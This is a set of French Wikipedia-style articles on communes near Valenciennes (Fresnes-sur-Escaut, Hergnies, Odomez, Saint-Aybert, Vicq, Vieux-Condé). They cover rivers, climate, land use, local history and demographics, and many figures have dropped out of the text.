Le 24 octobre 1868, un décret impérial déclare d’utilité publique l’établissement du chemin de fer d’Anzin jusqu’à Péruwelz (Belgique). La ligne des Chemins de fer d’Anzin reliant Somain à Péruwelz est opérationnelle en 1874. Fresnes possédait deux gares et une halte. La gare où nous sommes était la gare principale de Fresnes. C’était une grande gare de marchandises. La longueur des quais de déchargement dont on peut encore voir quelques vestiges nous laissent imaginer l’importance du trafic qui animait le secteur. Jusqu’à la date du 16 avril 1963, date de fermeture du service, de nombreux voyageurs empruntaient le train chaque jour.
Aujourd'hui, en 2025, la gare de Fresnes-sur-Escaut est en travaux de requalification jusqu'en 2026.
L'église Saint-Martin de Fresnes-sur-Escaut.
Au Fresnes était un hameau comportant 38 foyers et grandissait peu à peu, on comptait 92 foyers en 1560. Puis Fresnes devint un village, on y construisit une église avec le cimetière autour. C’était l'église saint Géry et se trouvait sur la grand place actuelle.Après l'installation de la première verrerie en 1710, puis la découverte du charbon en 1720, la population de Fresnes ne cesse d'augmenter. Fresnes entre dans l’ère industrielle et devient une ville. On vient de partout pour travailler à Fresnes aux verreries ou aux mines.La population qui était de lors de la révolution de 1789 en compte plus de 5000 en 1861. L'église était devenue trop petite. Elle était construite sur un terrain en pente crevassé par les affaissements miniers. Divisée en deux elle menaçait de s’effondrer à tout instant. Édifiée selon les plans de monsieur Maillard, architecte à Tourcoing, cette nouvelle église est de style néo-gothique avec ses colonnes en pierre de Soignies et ses chapiteaux sculptés.

</doc>
<doc id="192004" url="https://fr.wikipedia.org/wiki?curid=192004" title="Hergnies">
Hergnies

Hergnies est une commune française située dans le département du Nord (59), en région Hauts-de-France.
Elle est connue aussi pour sa race de poule dénommée la Poule d'Hergnies.
Géographie.
La commune est située à l'extrême nord de Valenciennes, entre l'Escaut et la frontière belge. Elle est à mi-distance entre Mortagne-du-Nord (confluence de la Scarpe et de l'Escaut) et Condé-sur-l'Escaut (ville militaire fortifiée).
Le territoire communal est traversé par la RD 102 qui permet de rejoindre la commune de l'Escaut et par la RD 86 qui permet de rejoindre la Belgique par Péruwelz.
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par l'Escaut canalisée, la Vergne, le Rieu de Condé, le fleuve l'Escaut, le ruisseau la Vergne et divers autres petits cours d'eau.
L'Escaut est un fleuve européen de de long, qui traverse trois pays (France, Belgique et Pays-Bas), avant de se jeter en mer du Nord. La partie canalisée en France relie Cambrai à , après avoir traversé .
La Vergne est un cours d'eau franco-belge d'une longueur de en France, qui prend sa source en Belgique, consitue ensuite une section de la frontière française et se jette dans le Jard à Flines-lès-Mortagne, après avoir traversé .
Le Jard, est un cours d'eau évacuant le trop-plein de l'étang de Chabaud-Latour, parallèle à l'Escaut canalisé à partir de Condé-sur-l'Escaut et s'y jetant (r.d.) à la limite entre Flines-lès-Mortagne et Château-l'Abbaye.
Deux plans d'eau complètent le réseau hydrographique : l'étang d'Amaury, d'une superficie totale de ( sur la commune) et l'étang Marius, d'une superficie totale de ( sur la commune).
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Escaut ». Ce document de planification concerne un territoire de de superficie, délimité par le bassin versant de l'Escaut. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est le syndicat mixte Escaut et Affluents (SyMEA).
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat océanique altéré et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de Valenciennes à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Hergnies est catégorisée ceinture urbaine, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle appartient à l'unité urbaine de Valenciennes (partie française), une agglomération internationale regroupant , dont elle est une commune de la banlieue. Par ailleurs la commune fait partie de l'aire d'attraction de Valenciennes (partie française), dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de à moins de .
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (61,9 % en 2018), en diminution par rapport à 1990 (72,7 %). La répartition détaillée en 2018 est la suivante : 
prairies (31,8 %), zones urbanisées (22,1 %), terres arables (21,6 %), zones agricoles hétérogènes (8,4 %), forêts (7,7 %), zones humides intérieures (4,4 %), eaux continentales (3,8 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Voies de communications et transports.
La commune est desservie par les lignes 100 et Illigo 2 du réseau Transvilles.
Toponymie.
Hergnies prend son nom actuel au .
Histoire.
En 1558, Hergnies appartenait à la seigneurie de Condé, dite « du château », et Charles II de Lalaing en fit l'acquisition.
Vers 1630, Baudouin du Bois de Hoves, écuyer, époux de Marie Fasse , puis de Jossine Sourdeau, est dit seigneur d'Hérignies.
La Compagnie des mines d'Anzin y entreprend l'exploitation charbonnière dès 1834. Elle s'y révèle difficile tant le territoire est humide. Vers 1970, un étang se forme à la suite d'un affaissement minier sur le site de la fosse Amaury, fermée en 1912. L'étang d'Amaury est inscrit au patrimoine mondial de l'Unesco.
La ville possédait un important marchés aux oies au début du . Les habitants de la commune sont depuis surnommés les "Culs d'osons", en référence au postérieur de l'animal.
Politique et administration.
Rattachements administratifs et électoraux.
La commune se trouve depuis 1824 dans l'arrondissement de Valenciennes du département du Nord. Pour l'élection des députés, elle fait partie depuis 1988 de la vingt et unième circonscription du Nord.
Elle faisait partie depuis 1793 du canton de Condé-sur-l'Escaut. Dans le cadre du redécoupage cantonal de 2014 en France, la commune a intégré le canton de Marly.
La commune relève du tribunal d'instance de Valenciennes, du tribunal de grande instance de Valenciennes, de la cour d'appel de Douai, du tribunal pour enfants de Valenciennes, du conseil de prud'hommes de Valenciennes, du tribunal de commerce de Valenciennes, du tribunal administratif de Lille et de la cour administrative d'appel de Douai.
Intercommunalité.
La commune fait partie de la communauté d'agglomération Valenciennes Métropole constitué en 2000 par la fusion de plusieurs intercommunalités.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 37,0 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 20,7 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 50,3 % de femmes, légèrement inférieur au taux départemental (51,77 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.

</doc>
<doc id="192005" url="https://fr.wikipedia.org/wiki?curid=192005" title="Odomez">
Odomez

Odomez est une commune française, située dans le département du Nord en région Hauts-de-France.
Géographie.
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par l'Escaut canalisée, le Malanoye, le Courant du Hainaut, le long héri, le Sarteau et un autre petit cours d'eau.
L'Escaut est un fleuve européen de de long, qui traverse trois pays (France, Belgique et Pays-Bas), avant de se jeter en mer du Nord. La partie canalisée en France relie Cambrai à , après avoir traversé .
Un plan d'eau complète le réseau hydrographique : l'étang d'Amaury, d'une superficie totale de ( sur la commune).
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Escaut ». Ce document de planification concerne un territoire de de superficie, délimité par le bassin versant de l'Escaut. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est le syndicat mixte Escaut et Affluents (SyMEA).
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat océanique altéré et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de Valenciennes à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Odomez est catégorisée commune rurale à habitat dispersé, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle appartient à l'unité urbaine de Saint-Amand-les-Eaux, une agglomération intra-départementale regroupant , dont elle est une commune de la banlieue. Par ailleurs la commune fait partie de l'aire d'attraction de Valenciennes (partie française), dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de à moins de .
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des forêts et milieux semi-naturels (46,2 % en 2018), en diminution par rapport à 1990 (47,5 %). La répartition détaillée en 2018 est la suivante : 
forêts (46,2 %), zones agricoles hétérogènes (20,8 %), terres arables (13,6 %), zones urbanisées (11,9 %), prairies (7,4 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Voies de communications et transports.
La commune est desservie par les lignes 109 et 133 du réseau Transvilles.
Toponymie.
D'après M. Gysseling, Odomez serait composé d'un anthroponyme germanique, "Aldawulf" (de "alda-", « vieux » et "wulfa-", « loup ») et du bas-latin "mansus", la demeure, le domaine.
Histoire.
La sablière du lièvre, à l'entrée de la forêt domaniale. Classée réserve botanique depuis plus de vingt ans, elle n'est plus exploitée depuis les années 1950. On peut y trouver la drosera, petite fleur carnivore qui y prolifère dans un milieu très fragile.
Le village est cité dès 1141, lorsque l'évêque d'Arras Alvise en fait don au chapitre de Condé.
La construction en 1925 d'une usine « La soierie » ("fabrique de viscose") est à l'origine de l'accroissement de la population au début du .
Politique et administration.
Maire en 1802-1803 : Riccart.
Maire en 1807 : Desclaibes.
Instances judiciaires et administratives.
La commune relève du tribunal d'instance de Valenciennes, du tribunal de grande instance de Valenciennes, de la cour d'appel de Douai, du tribunal pour enfants de Valenciennes, du conseil de prud'hommes de Valenciennes, du tribunal de commerce de Valenciennes, du tribunal administratif de Lille et de la cour administrative d'appel de Douai.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 37,9 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 21,2 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 50,32 % de femmes, légèrement inférieur au taux départemental (51,77 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.
Lieux et monuments.
La Soierie, fermée en 1965, sera par la suite mieux connue sous le nom de « Friche Kuhlmann ». Une communauté Emmaüs, les Compagnons du Hainaut, en occuperont une partie, le bâtiment "bas" ou bâtiment "des meubles" à partir de 1984. Les lieux ont été vidés par la Communauté peu de temps avant la démolition.
La dépollution et la démolition de la partie inoccupée du site ont débuté en et furent assurés par l'entreprise Apinor. La métropole y prévoit l'aménagement d'un espace vert, le Conseil Général a quant à lui un projet de voirie sur une partie du site.
La gare d'eau, attenante au bras de l'Escaut qui était longé par l'usine, close et séparée de la rivière à une date inconnue, était depuis utilisée par les nouveaux habitants de l'ancienne cité ouvrière, comme bassin de pêche, et comme dépotoir. La gare d'eau a été remblayée en partie par les débris des bâtiments détruits.

</doc>
<doc id="192006" url="https://fr.wikipedia.org/wiki?curid=192006" title="Saint-Aybert">
Saint-Aybert

Saint-Aybert est une commune française située dans le département du Nord, en région Hauts-de-France, limitrophe avec la Belgique.
Géographie.
Localisation.
Longitude est :
3° 39′ 00″ (degrés-minutes-secondes) ;
3,65 degrés centésimaux ;
0,063705 radians.
Latitude nord : 
50° 27′ 00″ (degrés-minutes-secondes) ;
50,45 degrés centésimaux ;
0,880519 radians.
Village frontalier de la Belgique (Hensies).
Villes proches : Condé-sur-l'Escaut à .
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par la Saint-Aybert, le canal de Mons de la Frontière Belge au confluent de l'Escaut canalisé, le Contre-fossé rive droite du canal de Mons, le marais de la Chapelle Saint-Aybert, le ruisseau du Séminaire et un autre petit cours d'eau.
Le canal Mons-Condé a été construit à partir de 1807 et mis en service en 1818, pour faciliter le transport du « charbon de terre » par l'Escaut, des mines du Borinage vers la France (le territoire belge faisait partie de l'Empire à l'époque napoléonienne). Il a été comblé au profit du Canal Nimy-Blaton-Péronnes.
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Escaut ». Ce document de planification concerne un territoire de de superficie, délimité par le bassin versant de l'Escaut. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est le syndicat mixte Escaut et Affluents (SyMEA).
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat océanique altéré et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de Valenciennes à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Saint-Aybert est catégorisée commune rurale à habitat dispersé, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle est située hors unité urbaine. Par ailleurs la commune fait partie de l'aire d'attraction de Valenciennes (partie française), dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de à moins de .
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (80 % en 2018), en diminution par rapport à 1990 (86,5 %). La répartition détaillée en 2018 est la suivante : 
prairies (63,4 %), zones humides intérieures (9,5 %), terres arables (9 %), zones agricoles hétérogènes (7,7 %), zones urbanisées (5,8 %), forêts (4,6 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Voies de communications et transports.
La commune est desservie par la ligne 109 du réseau Transvilles.
Toponymie.
Le village doit son nom à un moine de l'abbaye de Crespin, Aybert (1060-1140), qui vint y terminer sa vie en ermite.
Histoire.
La commune a été créée en 1837, par détachement de son territoire de celle de Crespin.
Politique et administration.
Rattachements administratifs et électoraux.
La commune, créée en 1837, se trouve dans l'arrondissement de Valenciennes du département du Nord. Pour l'élection des députés, elle fait partie depuis 2012 de la vingt et unième circonscription du Nord.
Elle faisait partie depuis sa création du canton de Condé-sur-l'Escaut. Dans le cadre du redécoupage cantonal de 2014 en France, la commune fait désormais partie du canton de Marly
Intercommunalité.
La commune fait partie de la communauté d'agglomération Valenciennes Métropole, créée fin 2000.
Liste des maires.
Maire en 1881 : Joisse-Benoit.
Instances judiciaires et administratives.
La commune relève du tribunal d'instance de Valenciennes, du tribunal de grande instance de Valenciennes, de la cour d'appel de Douai, du tribunal pour enfants de Valenciennes, du conseil de prud'hommes de Valenciennes, du tribunal de commerce de Valenciennes, du tribunal administratif de Lille et de la cour administrative d'appel de Douai.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 31,2 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 26,7 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 50,27 % de femmes, légèrement inférieur au taux départemental (51,77 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.
Culture locale et patrimoine.
Lieux et monuments.
Classé au patrimoine historique, le puits Saint-Aybert, dont la commune a hérité du nom en 1837.

</doc>
<doc id="192008" url="https://fr.wikipedia.org/wiki?curid=192008" title="Thivencell">
Thivencell



</doc>
<doc id="192009" url="https://fr.wikipedia.org/wiki?curid=192009" title="Vicq (Nord)">
Vicq (Nord)

Vicq est une commune française située dans le département du Nord, en région Hauts-de-France.
Géographie.
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par la dérivation du canal de saint saulve et divers autres petits cours d'eau.
La commune abritait autrefois un vaste marais, conjoint à celui de Fresne et d'Escaupont, dont il reste des reliques alimentées à la fois par la nappe et les eaux de surface, fortement boisées par des peupliers et saules qui en rabattent la nappe.
La toponymie et le cadastre ont conservé la mémoire de ces zones humides.
Des graves de silex ont été découvertes dans le marais de Vicq.
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Escaut ». Ce document de planification concerne un territoire de de superficie, délimité par le bassin versant de l'Escaut. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est le syndicat mixte Escaut et Affluents (SyMEA). 
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité. 
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat océanique altéré et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de Valenciennes à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Vicq est catégorisée ceinture urbaine, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle appartient à l'unité urbaine de Valenciennes (partie française), une agglomération internationale regroupant , dont elle est une commune de la banlieue. Par ailleurs la commune fait partie de l'aire d'attraction de Valenciennes (partie française), dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de à moins de .
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (80,1 % en 2018), en diminution par rapport à 1990 (85,8 %). La répartition détaillée en 2018 est la suivante : 
terres arables (52,6 %), zones urbanisées (16,7 %), prairies (11,2 %), cultures permanentes (9,4 %), zones agricoles hétérogènes (6,9 %), forêts (3,2 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Voies de communications et transports.
La commune est desservie par la ligne 6 du réseau Transvilles.
Toponymie.
"Vy", "Vi," "Vicus", "Vij", "Vii", "Wic", "Wicq", selon des documents entre les . La forme "Vi" proviendrait du latin "vicus", signifiant bourg ou village.
Histoire.
Des traces d'occupation préhistorique, gauloise et gallo-romaine sont nombreuses dans la région qui a ensuite été victime de nombreuses occupations, invasions, pillages, guerres et batailles, avec par exemple en 881, une expédition de Regnier au long col, comte de Hainaut qui tentait de s'opposer à un chef viking à Condé-sur-Escaut. Une bataille sanglante a eu lieu à la lisière des marais de Vicq, où le Comte du Hainaut fut défait et fait prisonnier.
Avant la Révolution française, Vicq a donné son nom à une famille de la noblesse.
Bonaventure Éloy (1706-1791), chevalier, est seigneur de Vicq, en vertu de lettres de terrier obtenues du roi en mai 1758. Né à Soignies (Belgique), fils de Jacques-Macaire et de Marie-Isabelle Dutrieux, il exerce diverses fonctions d'importance. Avocat au conseil souverain du Brabant, il est naturalisé français par lettres données à Fontainebleau en octobre 1732. En 1733, il est conseiller à la cour du Parlement de Flandres, passe conseiller au conseil supérieur de Douai le , doyen du Parlement de Flandres en 1776, président de la noblesse du bailliage de Douai en 1789, où il participe aux réunions préparatoires aux États Généraux. Il meurt à Douai le , à 85 ans. Il épouse le Marie-Philippine-Joseph Bridoul (1709-1779). Baptisée à Douai le , elle est la fille de Jean-Hippolyte-Géry Bridoul, bourgeois de Douai, conseiller référendaire au Parlement de Flandres et de Marie-Françoise de Fontaine. Elle meurt à Douai le , à 69 ans.
Les abords du marais étaient autrefois desservis par une voie ferrée (déclassée) qui reliait Blanc-Misseron à Saint-Amand-les-Eaux par Fresnes-sur-Escaut. Deux arrêts étaient proposés, rue de Crespin (ou de la gare) et rue Basse, avec barrière et passage à niveau. Une halte temporaire au niveau du marais existait lors des fêtes hippiques de Valenciennes célébrées dans le marais chaque année au mois d'août au siècle.
Le , le village s'est cru replongé au temps de la Seconde Guerre mondiale : pendant la nuit, un bombardier anglais en perdition percute un groupe de maisons ouvrières. L'accident fait quatre morts, une femme et deux enfants brulés vifs, et le pilote de l'avion. Celui-ci avait été volé à Portsmouth par un élève pilote de l'armée de l'air britannique, la Royal Air Force (RAF).
Politique et administration.
Instances judiciaires et administratives.
La commune relève du tribunal d'instance de Valenciennes, du tribunal de grande instance de Valenciennes, de la cour d'appel de Douai, du tribunal pour enfants de Valenciennes, du conseil de prud'hommes de Valenciennes, du tribunal de commerce de Valenciennes, du tribunal administratif de Lille et de la cour administrative d'appel de Douai.
Instances religieuses.
Vicq, sous le patronage de saint Nicolas, fait partie de la paroisse Sainte-Marie-Goretti du Hainaut qui regroupe 12 villages, dont le centre est à Onnaing, au sein du Doyenné des Marches du Hainaut (centre à Bruay-sur-Escaut), comportant également les 2 autres paroisses de Saint-Jacques en Val d'Escaut (centre à Bruay-sur-Escaut) et de Saint-François en Val d'Escaut (centre à Condé-sur-Escaut), du Diocèse de Cambrai.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 38,6 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 20,1 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 51,15 % de femmes, légèrement inférieur au taux départemental (51,77 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.
Culture locale et patrimoine.
Lieux et monuments.
Autres lieux : le calvaire, la chapelle Sainte Rita.

</doc>
<doc id="192010" url="https://fr.wikipedia.org/wiki?curid=192010" title="Vieux-Condé">
Vieux-Condé

Vieux-Condé est une commune française de la banlieue de Valenciennes, située à la frontière avec la Belgique sur le cours canalisé de l'Escaut, dans le département du Nord, en région Hauts-de-France. Vieux-Condé et ses alentours ont appartenu au comté du Hainaut, au royaume de France, aux Pays-Bas espagnols et aux Pays-Bas méridionaux (en latin Belgica Regia).
Géographie.
Description.
Vieux-Condé est une petite ville séparée de Péruwelz par la frontière franco-belge.
Transports.
Vieux-Condé est desservie par la ligne T2 du tramway de Valenciennes. La station terminus "Le Boulon" est implantée sur le territoire de la commune. Vieux-Condé est également desservie par les lignes de , 100, 109, 133 et du réseau Transvilles.
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par l'Escaut canalisée, la Vergne, le Jard, le long héri, le ruisseau de Cerfontaine et un autre petit cours d'eau.
L'Escaut est un fleuve européen de de long, qui traverse trois pays (France, Belgique et Pays-Bas), avant de se jeter en mer du Nord. La partie canalisée en France relie Cambrai à Saint-Quentin, après avoir traversé .
La Vergne est un cours d'eau franco-belge d'une longueur de en France, qui prend sa source en Belgique, constitue ensuite une section de la frontière française et se jette dans le Jard à Flines-lès-Mortagne, après avoir traversé .
Le Jard est un cours d'eau évacuant le trop-plein de l'étang de Chabaud-Latour, parallèle à l'Escaut canalisé à partir de Condé-sur-l'Escaut et s'y jetant (r.d.) à la limite entre Flines-lès-Mortagne et Château-l'Abbaye.
Deux plans d'eau complètent le réseau hydrographique : l'étang d'Amaury, d'une superficie totale de ( sur la commune) et l'étang Marius, d'une superficie totale de ( sur la commune).
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Escaut ». Ce document de planification concerne un territoire de de superficie, délimité par le bassin versant de l'Escaut. Le périmètre est arrêté le et le SAGE proprement dit est approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est le syndicat mixte Escaut et Affluents (SyMEA).
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat océanique altéré et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de Valenciennes à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Vieux-Condé est catégorisée ceinture urbaine, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
